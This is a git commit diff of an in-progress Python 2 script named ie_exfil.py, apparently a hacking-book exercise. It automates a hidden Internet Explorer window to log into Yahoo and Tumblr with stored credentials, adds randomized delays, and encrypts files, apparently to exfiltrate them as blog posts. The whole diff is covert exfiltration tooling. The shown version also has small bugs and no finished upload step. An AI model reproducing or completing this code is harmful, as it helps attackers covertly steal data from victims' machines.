6fbf1be8ca0f83363234d9c95170bdd770716c28
A Sadavoy <sadavoya@gmail.com>
2017-02-20 20:39:57 -0500

    in progress: ie_exfil

--- 09chapter/exfiltration/ie_exfil.py
+++ 09chapter/exfiltration/ie_exfil.py
@@ -1,14 +1,15 @@
 '''exfiltrate encrypted data'''
 import util
 
-#import win32com.client
+import win32com.client
 import os
 import fnmatch
 import time
 import random
 #import zlib
 
-
+RANDOM_MIN = 2
+RANDOM_MAX = 4
 PUBLIC_KEY = ''
 
 def wait_for_browser(browser):
@@ -37,34 +38,74 @@ def encrypt_post(filename, key=None):
     enc_title = enc.encrypt_string(key, filename)
     enc_body = enc.encrypt_string(key, contents)
     return enc_title, enc_body
-def random_sleep(min_seconds=5, max_seconds=10):
+def random_sleep(min_seconds=RANDOM_MIN, max_seconds=RANDOM_MAX):
     '''sleep for a random amount of time between min and max seconds'''
     time.sleep(random.randint(min_seconds, max_seconds))
     return
-def login_to_tumblr(ie, values):
-    '''log into tumblr'''
-    # retrieve full contents of document
+
+def click_button(full_doc, values):
+    '''click the specified button'''
+    random_sleep()
+    clicked = False
+    for i in full_doc:
+        if i.id in values:
+            try:
+                i.click()
+                clicked = True
+                break
+            except Exception, err:
+                print str(err)
+    return clicked
+
+def set_attr(full_doc, values, focus_before=True, focus_after=True, min_seconds=RANDOM_MIN, max_seconds=RANDOM_MIN):
+    '''set the attributes'''
+    value_set = False
+    for i in full_doc:
+        if i.id in values.keys():
+            if focus_before:
+                i.focus()
+            random_sleep(min_seconds, max_seconds)
+            i.setAttribute('value', values[i.id])
+            if focus_after:
+                i.focus()
+            value_set = True
+            break
+    return value_set
+
+
+
+def login_to_yahoo(ie, values):
+    '''log into yahoo to log into tumblr'''
     full_doc = ie.Document.all
 
-    #iterate looking for the login form
-    for i in full_doc:
-        if i.id in values.keys:
-            i.setAttribute('value', values[i.id])
-
-    random_sleep()
-
-    try:
-        if ie.Document.forms[0].id != 'signup_form':
-            ie.Document.forms[0].submit()
-        else:
-            ie.Document.forms[1].submit()
-    except IndexError, err:
-        print str(err)
-
-    random_sleep()
-
+    logged_in = False
+    forms = [
+        'mbr-login-form',
+        'signup_form'
+    ]
+    if set_attr(full_doc, values['username']):
+        if click_button(full_doc, values['buttons']):
+            wait_for_browser(ie)
+            #full_doc = ie.Document.all
+            set_attr(full_doc, values['password'], min_seconds=0, max_seconds=1)
+            logged_in = click_button(full_doc, values['buttons'])
+            if set_attr(full_doc, values['password'], focus_before=False):
+                logged_in = click_button(full_doc, values['buttons'])
+                wait_for_browser(ie)
+    return logged_in
+def login_to_tumblr(ie, values):
+    '''log into tumblr'''
+    time.sleep(5)
+    ie.navigate(values['tumblr_url'])
     wait_for_browser(ie)
-    return
+
+    full_doc = ie.Document.all
+
+    logged_in = False
+    if set_attr(full_doc, values['username']):
+        logged_in = click_button(full_doc, values['buttons'])
+        wait_for_browser(ie)
+    return logged_in
 
 def main():
     '''main'''
@@ -83,23 +124,65 @@ def main():
     #util.test_encryption((PUBLIC_KEY, priv_key), verbosity=0)
     login_values = {
         'url' : str.strip(lines[0]),
-        'signup_email' : str.strip(lines[1]),
-        'signup_password' : str.strip(lines[2])
+        'buttons' : [
+            'login-signin',
+            'signup_forms_submit'
+        ],
+        'username' : {
+            'login-username' : str.strip(lines[1]),
+            'signup_determine_email' : str.strip(lines[1])
+        },
+        'password' : {
+            'login-passwd' : str.strip(lines[2])
+        },
+        'tumblr_url' : str.strip(lines[3])
     }
-    for k, v in login_values.iteritems():
-        print "%s : %s" % (k,v)
+    test_login(login_values)
 
 
-    #test_login(login_values)
+class MyBrowser(object):
+    '''browser abstraction'''
+    def __init__(self):
+        self._ie = None
+    def get_ie(self):
+        '''get an ie instance'''
+        if self._ie is None:
+            self._ie = win32com.client.Dispatch('InternetExplorer.Application')
+        return self._ie
+    def visible(self, visible=0):
+        '''set ie visible'''
+        ie = self.get_ie()
+        ie.visible = visible
+    def wait_for_browser(self):
+        '''wait for the broswer to do its thing'''
+        ie = self.get_ie()
+        ready_states = [4, 'complete']
+        while ie.ReadyState not in ready_states:
+            time.sleep(0.1)
+        return
+    def navigate(self, target):
+        '''navigate to target'''
+        ie = self.get_ie()
+        ie.Navigate(target)
+        self.wait_for_browser()
+
+def open_browser(values, visible=0):
+    my_ie = MyBrowser()
+    my_ie.visible(visible=visible)
+    my_ie.navigate(values['url'])
+    return my_ie.get_ie()
+
 def test_login(values):
-    ie = win32com.client.Dispatch('InternetExplorer.Application')
-    ie.Visible = 1
-    ie.Navigate(values['url'])
-    wait_for_browser(ie)
-    print 'Logging into tumblr...'
-    login_to_tumblr(ie, values)
+    '''test the login process'''
+    ie = open_browser(values, visible=1)
+    print 'Logging into yahoo...'
+    login_to_yahoo(ie, values)
     print 'Logged in.'
-    
+
+    print 'Navigating to tumblr...'
+    login_to_tumblr(ie, values)
+    print 'Done.'
+
 
 if __name__ == '__main__':
     main()
